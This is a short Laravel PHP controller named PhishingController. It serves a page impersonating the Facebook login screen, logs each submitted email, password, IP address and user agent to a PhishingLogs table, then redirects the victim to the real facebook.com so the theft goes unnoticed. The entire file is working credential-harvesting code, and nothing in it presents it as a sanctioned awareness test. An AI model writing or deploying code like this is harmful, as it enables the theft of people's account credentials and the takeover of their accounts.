<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class PhishingController extends Controller
{
    public function showLoginPage()
    {
        return view('facebook');
    }

    public function captureCredentials(Request $request)
{
    \App\Models\PhishingLogs::create([
        'email' => $request->email,
        'password' => $request->password,
        'ip_address' => $request->ip(),
        'user_agent' => $request->userAgent(),
    ]);

    return redirect('https://facebook.com');
}
}

